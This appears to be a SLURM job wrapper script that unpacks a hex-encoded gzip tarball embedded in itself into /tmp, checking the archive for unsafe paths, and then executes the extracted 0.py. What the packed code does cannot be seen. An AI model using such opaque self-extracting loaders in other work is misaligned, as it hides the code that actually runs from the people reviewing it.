#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95cf6fdb2014c77bf65f8172c196228263fc23a972dc7d876d97a9aa30c60969021690b5d9b4ff7d604755a64abbb5ddb4f739186378dff778f030257b67f4cdab420315a5634b5fb6b428d8f3fbf4bdaaabfa06d1d70d6be2e43cb7c1e55bf8fa0bf931f3e641ead91acd784bf365c1caaa6e56b3399a0dfc7c30bcbb773bbe2cab3823af73c6792b455fc8a293455f97b45be58d28055dd23667395dc9a2e5a2aaf2a669eaa2a1cb8a32ce98e8caa6e5d7aaedd94b1744cb6245ebaa882307aeaf9cad68d3941dad5ac6ba42304665dbd0beaa795bb3ba9375be2a8b8e8aae978c767dcf581b86ca56702a972c8432fbf9deb9fd17a06438bfba8f3fd77f9ee72fea9fb102eaff2d50c7c1588fdcd9cde38f60bee36e7750ed3c24a5570799f4d61cd1c07dfc882e933f866e6237b1498321e176fbed6b7e97dd8a4dd420b1be5d9ada05a6e3df0567c4ca50f25e3ef934cb123e99e2c560cd5e0abf10e6783c69e5cf8bfdfe2c4f7a8bb385f88ac79b09df4519bffd8e13ee9c0cee2f2192e9aa48f9243ede27419dece453a7b6d205579b4d50f9fd1ac377c9a3f23b74591f3183d429cf1077c8af13d41b8b24527aec20d5236d3c9244f3a324f1a07817ad536cacd871dbddef72bac0d95a18ed953ec96b1be5a283344341121382a3eab8ee492e2343945b5bae9c445ff8e1243f586b6c8a3f6bc7fb18c470f2380b92c326a472c08bc9f0768896527b727ce8944da78edb7cb22739974fcaf97bf330f6b230f5d12a2f2fc9f1246c80e5c28f81c96957e286c44d8c7b4c948e194ee9dc799b8e4ec3e87804ae164cf6e6f9281cb9d2497ca4364bdefb2c03000000000000000000000000000000000000000000c0ffca2fe250645300280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
